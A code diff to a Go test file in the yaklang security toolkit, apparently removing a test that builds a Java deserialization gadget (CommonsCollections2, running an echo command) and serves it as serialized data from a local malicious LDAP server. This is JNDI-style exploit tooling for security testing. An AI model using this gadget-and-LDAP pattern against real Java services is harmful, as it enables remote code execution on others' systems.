@@ -3,7 +3,6 @@ package facades
 import (
 	"context"
 	"fmt"
-	"github.com/yaklang/yaklang/common/utils"
 	"github.com/yaklang/yaklang/common/yso"
 	"testing"
 )
@@ -44,22 +43,4 @@ func TestFacadeServer(t *testing.T) {
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 	s.ServeWithContext(ctx)
-}
-func TestFacadeServerYsoSerialize(t *testing.T) {
-	gadget, err := yso.GenerateGadget(string(yso.GadgetCommonsCollections2), "RuntimeExec", "echo 1 > /tmp/1.txt")
-	if err != nil {
-		t.Fatal(err)
-	}
-	byts, err := yso.ToBytes(gadget)
-	if err != nil {
-		t.Fatal(err)
-	}
-	server := NewFacadeServer("127.0.0.1", 8089)
-	server.Config(
-		SetLdapResponseEntry("aaa", map[string]any{
-			"javaSerializedData": byts,
-			"javaClassName":      utils.RandStringBytes(5),
-		}, "gadget"),
-	)
-	server.Serve()
 }
